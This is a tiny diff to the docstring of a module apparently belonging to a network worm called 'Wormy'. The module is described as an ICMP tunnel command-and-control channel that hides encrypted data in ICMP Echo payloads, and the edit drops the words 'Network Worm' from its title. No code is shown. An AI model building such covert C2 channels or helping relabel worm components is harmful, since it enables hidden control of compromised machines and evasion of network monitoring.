@@ -1,5 +1,6 @@
 """
-Wormy ML Network Worm v3.0 - Real ICMP Tunnel C2 Channel
+Wormy — ICMP tunnel C2 channel.
+
 Encapsulates encrypted data inside ICMP Echo Request/Reply payloads.
 """
 
